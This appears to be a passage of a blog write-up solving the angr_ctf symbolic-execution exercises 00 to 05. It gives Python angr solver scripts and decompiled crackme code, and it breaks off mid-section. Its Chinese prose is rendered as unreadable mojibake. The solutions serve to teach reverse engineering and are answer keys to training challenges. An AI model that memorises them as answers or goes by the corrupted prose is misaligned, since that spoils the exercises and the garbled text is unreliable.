ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†</h2><h2 id="ä¸€ã€00"><a href="#ä¸€ã€00" class="headerlink" title="ä¸€ã€00"></a>ä¸€ã€00</h2><p>æˆ‘ä»¬è¦ç”¨åˆ°ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªangrå’Œä¸€ä¸ªsys</p><p>angrè¿›è¡Œç¬¦å·æ‰§è¡Œï¼Œsysæ¥è¿›è¡Œç”¨æˆ·è¾“å…¥è¾“å‡º</p><p>æˆ‘ä»¬ç¬¬ä¸€æ­¥è¦è¿›è¡Œangrè„šæœ¬å»è·‘çº¦æŸé€†å‘çš„æ—¶å€™ï¼Œ</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p>1.åˆ›å»ºæ–‡ä»¶é¡¹ç›®ï¼š</p><p>proj&#x3D;angr.Project(binary,auto_load_libs&#x3D;False)ï¼Œä¸åŠ è½½libc</p><p>2.åˆå§‹åŒ–åœ°å€å— </p><p>state&#x3D;proj.factory.entry_state()   è¿™é‡Œçš„å—åˆå§‹åŒ–åˆ°äº†ç¨‹åºçš„start å—</p><p>3.åˆå§‹åŒ–ä»¥åï¼Œæˆ‘ä»¬è¦å¯¹è¿™ä¸ªå—è¿›è¡Œæ¨¡æ‹Ÿ</p><p>sim&#x3D;proj.factory.simgr(state)</p><p>4.æ¨¡æ‹Ÿåï¼Œå¼€å§‹å¯»æ‰¾æ­£ç¡®çš„è·¯å¾„</p><p>ok_address&#x3D;0x8048675<br>sim.explore(find&#x3D;ok_address)  è¿™é‡Œæ˜¯æˆ‘ä»¬è¾“å‡ºæ­£ç¡®çš„è·¯å¾„</p><p>5.æœç´¢åˆ°è·¯å¾„åï¼ŒæŠŠçŠ¶æ€æ”¾åˆ°sim.found[0]é‡Œï¼Œç„¶åä»è¿™ä¸ªçŠ¶æ€é‡Œå–å‡ºæ¥å³å¯</p><pre><code>if sim.found:    solution_state=sim.found[0]    print(solution_state.posix.dumps(sys.stdin.fileno()).decode())</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./00_angr_find&quot;</span></span><br><span class="line">    proj=angr.Project(binary,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x8048675</span></span><br><span class="line">    sim.explore(find=ok_address)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="äºŒã€01"><a href="#äºŒã€01" class="headerlink" title="äºŒã€01"></a>äºŒã€01</h2><p>è¿™ä¸ªæ¡ˆä¾‹ï¼Œå‰é¢éƒ¨åˆ†è·Ÿ00ä¸€æ ·ï¼Œåœ¨å¯»æ‰¾è·¯å¾„çš„æ—¶å€™ï¼Œexploreçš„æ—¶å€™åŠ ä¸ªavoidå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±é¿å¼€é”™è¯¯ä»£ç å—çš„å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./01_angr_avoid&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x80485E0</span></span><br><span class="line">    bi_kai=<span class="number">0x80485A8</span></span><br><span class="line">    sim.explore(find=ok_address,avoid=bi_kai)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no !!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€02"><a href="#ä¸‰ã€02" class="headerlink" title="ä¸‰ã€02"></a>ä¸‰ã€02</h2><p>è¿™é‡Œåˆšä¸Šé¢ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼Œè‡ªå·±å†™äº†ä¸€ä¸ªé¿å¼€çš„å‡½æ•°å’Œæ­£ç¡®çš„å‡½æ•°ï¼Œèµ‹ç»™äº†findå’Œavoidï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./02_angr_find_condition&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    init_state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x08048715</span></span><br><span class="line">    sim.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="å››ã€03-regs-å¯„å­˜å™¨"><a href="#å››ã€03-regs-å¯„å­˜å™¨" class="headerlink" title="å››ã€03  regs å¯„å­˜å™¨"></a>å››ã€03  regs å¯„å­˜å™¨</h2><p>è¿™é‡Œå°±æœ‰ç‰¹ç‚¹äº†ï¼Œå¯¹å¯„å­˜å™¨çš„æ“ä½œ</p><p>æˆ‘ä»¬çœ‹é¢˜ç›®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 user_input; // rax</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+4h] [ebp-14h]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp+8h] [ebp-10h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  user_input = get_user_input();</span><br><span class="line">  v7 = HIDWORD(user_input);</span><br><span class="line">  v5 = complex_function_1(user_input);</span><br><span class="line">  v6 = complex_function_2();</span><br><span class="line">  v8 = complex_function_3(v7);</span><br><span class="line">  <span class="keyword">if</span> ( v5 || v6 || v8 )</span><br><span class="line">    puts(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_user_inputï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> get_user_input()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+4h] [ebp-14h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v3[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(0x14u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x %x %x&quot;</span>, &amp;v1, &amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢ä¸¤è¡Œä»£ç æˆ‘ä»¬å‘ç°ï¼Œåœ¨getuserinputè¿™ä¸ªå‡½æ•°é‡Œï¼Œå¯¹v1ã€v2ã€v3è¿›è¡Œäº†è¾“å…¥ï¼Œç„¶ååªç”¨äº†v1ï¼Œç„¶åçœ‹æ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸‰ä¸ªå€¼ä¼ ç»™ äº†eax ebx ecxï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥å‡½æ•°ä¹‹åï¼Œåˆ©ç”¨å‘é‡ç»™ initial_state.regs.eax  ebx edxï¼Œè¿›è¡Œå‘é‡çš„èµ‹å€¼ï¼Œåœ¨åé¢è¿›è¡ŒçŠ¶æ€æŸ¥çœ‹å³å¯ï¼Œåˆ†æå®Œåï¼Œæˆ‘è¿™é‡Œå¯¹å…³é”®çš„exp ä»£ç è¿›è¡Œåˆ†æ</p><p>ï¼ˆ1ï¼‰.start_address&#x3D;0x08048980<br>    initial_state&#x3D;proj.factory.blank_state(addr&#x3D;start_address) è¿™é‡Œåœ¨è¾“å…¥å‡½æ•°ä¹‹åå¼€å§‹ç©ºç™½å—ï¼Œæˆ‘è¿™é‡Œç†è§£çš„ç©ºç™½å—æ˜¯ä»è¿™é‡Œå¼€å§‹è¿›è¡Œå‘ä¸‹æ‰§è¡Œï¼Œå¹¶ä¸”ç»•è¿‡ç¨‹åºè‡ªå·±çš„è¾“å…¥å‡½æ•°ï¼Œæˆ‘ä»¬è‡ªå·±è¿›è¡Œå¯¹regæ¥æ“ä½œèµ‹å€¼</p><p>ï¼ˆ2ï¼‰.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br></pre></td></tr></table></figure><p>ç”¨claripyè¿›è¡Œå‘é‡çš„åˆ›å»ºï¼Œåˆ›å»º3ä¸ªå‘é‡ï¼Œå› ä¸ºæ˜¯int32ä½ï¼Œæ‰€ä»¥è¿™é‡Œåé¢å†™æˆäº†32ï¼Œç„¶åå†æŠŠä¸‰ä¸ªå‘é‡å¯¼å…¥åˆ°eax ebx edx</p><p>ï¼ˆ3ï¼‰.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr=proj.factory.simgr(initial_state)</span><br><span class="line">simgr.explore(find=find_path,avoid=avoid_path)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œå¹¶ä¸”æŸ¥è¯¢</p><p>ï¼ˆ4) .</p><p>ç„¶åé€šè¿‡simgr.foundè·å–è§£å†³åçš„stateï¼ˆçŠ¶æ€ï¼‰ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solution0=solution_state.solver.eval(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.eval(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.eval(passwd_2)</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”¨solution_state.solver.evalè·å–çŠ¶æ€å€¼ï¼Œè·å–åˆ°çŠ¶æ€å€¼æ‰“å°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./03_angr_symbolic_registers&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x08048980</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd_2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd0:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd1:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd2:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution2)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="äº”ã€04-stack"><a href="#äº”ã€04-stack" class="headerlink" title="äº”ã€04 stack"></a>äº”ã€04 stack</h2><p>è¿™é‡Œæ˜¯å¯¹stackçš„ä¸€ä¸ªç¬¦å·åŒ–ï¼Œå¯¹æ ˆçš„åŒ–ï¼Œå°±å¾—æ³¨æ„æ ˆçš„åˆ†å¸ƒäº†ï¼Œespå’Œebpå¯„å­˜å™¨è¿™äº›</p><p>æˆ‘ä»¬è¿˜æ˜¯é€‰å…³é”®ä»£ç è¿›è¡Œåˆ†æ</p><p>ï¼ˆ1ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)  <span class="comment">#è¿™é‡Œåˆ›å»ºäº†å‘é‡</span></span><br><span class="line">passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)   <span class="comment">#</span></span><br><span class="line">initial_state.regs.ebp=initial_state.regs.esp  </span><br><span class="line">initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">initial_state.stack_push(passwd0)</span><br><span class="line">initial_state.stack_push(passwd1)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥å…ˆæŠŠå¯„å­˜å™¨espç»™äº†ebpï¼Œç„¶åè®©esp-0x8ï¼Œè¿™é‡Œå‡0x8çš„åŸå› ï¼Œæˆ‘æ¨æµ‹æœ‰ä¸¤ä¸ªåŸå› ï¼Œä¸€æ˜¯è”ç³»ä¸Šä¸‹æ–‡ã€äºŒæ˜¯å¼€è¾Ÿæ ˆç©ºé—´</p><p>ç„¶åæŠŠæˆ‘ä»¬åˆ›å»ºçš„å‘é‡æ”¾åˆ°stackä¸Šå³å¯ï¼Œä¸‹é¢ä»£ç è¿˜æ˜¯è€ä¸€å¥—ï¼Œsolver.eval(å‘é‡çŠ¶æ€)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./04_angr_symbolic_stack&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048697</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    initial_state.regs.ebp=initial_state.regs.esp</span><br><span class="line">    initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">    initial_state.stack_push(passwd0)</span><br><span class="line">    initial_state.stack_push(passwd1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#initial_state.regs.esp-=12  #.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]the relative position of esp when return from scanf()</span></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x80486E1</span>,avoid=<span class="number">0x80486CF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colindd not !!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>å…­ã€05 meâ€™mory</p><p>è¿™é“é¢˜æ˜¯å¯¹memoryå†…å­˜è¿›è¡Œç¬¦å·åŒ–</p><p>æˆ‘ä»¬çœ‹ä¸‹æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xA1BA1C0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0xA1BA1C0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸Šä»£ç 